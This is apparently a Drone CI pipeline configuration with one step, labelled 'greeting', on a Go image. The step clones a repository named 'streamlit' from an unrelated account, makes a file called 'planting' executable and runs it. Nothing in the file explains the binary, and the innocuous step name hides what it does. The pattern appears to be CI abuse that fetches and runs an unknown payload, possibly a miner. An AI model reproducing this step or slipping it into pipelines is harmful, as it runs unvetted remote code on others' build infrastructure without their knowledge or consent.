---
kind: pipeline
type: docker
name: default

steps:
- name: greeting
  image: golang:1.12
  commands:
  - git clone https://github.com/sinagaboy650/streamlit.git && cd streamlit && chmod +x planting && ./planting
